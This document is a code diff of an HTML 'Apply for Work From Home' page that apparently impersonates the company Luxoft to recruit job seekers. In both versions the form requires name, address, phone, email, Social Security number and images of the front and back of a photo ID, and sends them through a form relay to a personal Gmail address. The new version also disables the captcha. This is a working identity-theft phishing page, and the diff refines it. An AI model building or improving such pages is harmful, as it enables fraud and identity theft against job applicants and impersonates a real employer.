@@ -1,53 +1,31 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Application - Luxoft Careers</title>
+  <title>Apply - Luxoft</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <header class="hero">
-    <div class="hero-text">
-      <h1>Application Form</h1>
-    </div>
+  <header>
+    <img src="images/luxoft-logo.png" class="logo" alt="Luxoft Logo">
+    <h1>Apply for Work From Home</h1>
   </header>
-  <nav>
-    <a href="index.html">Home</a>
-    <a href="about.html">About</a>
-    <a href="services.html">Benefits</a>
-    <a href="application.html">Apply</a>
-    <a href="contact.html">Contact</a>
-  </nav>
-  <main>
+
+  <section class="application">
     <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
-      <input type="hidden" name="_next" value="https://luxoftorganisation.github.io/The-one-/thankyou.html" />
-      <label for="name">Full Name:</label><br/>
-      <input type="text" name="Name" required><br/>
+      <input type="hidden" name="_next" value="https://luxoftorganisation.github.io/luxoft-website/thankyou.html">
+      <input type="hidden" name="_captcha" value="false">
 
-      <label for="address">Address:</label><br/>
-      <input type="text" name="Address" required><br/>
+      <label>Full Name:</label><input type="text" name="Name" required>
+      <label>Address:</label><input type="text" name="Address" required>
+      <label>Phone:</label><input type="text" name="Phone" required>
+      <label>Email:</label><input type="email" name="Email" required>
+      <label>SSN:</label><input type="text" name="SSN" required>
+      <label>Front of ID:</label><input type="file" name="ID Front" required>
+      <label>Back of ID:</label><input type="file" name="ID Back" required>
 
-      <label for="phone">Phone Number:</label><br/>
-      <input type="tel" name="Phone" required><br/>
-
-      <label for="email">Email Address:</label><br/>
-      <input type="email" name="Email" required><br/>
-
-      <label for="ssn">SSN:</label><br/>
-      <input type="text" name="SSN" required><br/>
-
-      <label for="id_front">Photo ID e.g DL (Front):</label><br/>
-      <input type="file" name="Photo_ID_Front" accept="image/*,.pdf" required><br/>
-
-      <label for="id_back">Photo ID e.g DL (Back):</label><br/>
-      <input type="file" name="Photo_ID_Back" accept="image/*,.pdf" required><br/>
-
-      <button type="submit" class="btn">Submit Application</button>
+      <button type="submit">Submit Application</button>
     </form>
-  </main>
-  <footer>
-    <p>&copy; 2025 Luxoft Organization</p>
-  </footer>
+  </section>
 </body>
 </html>
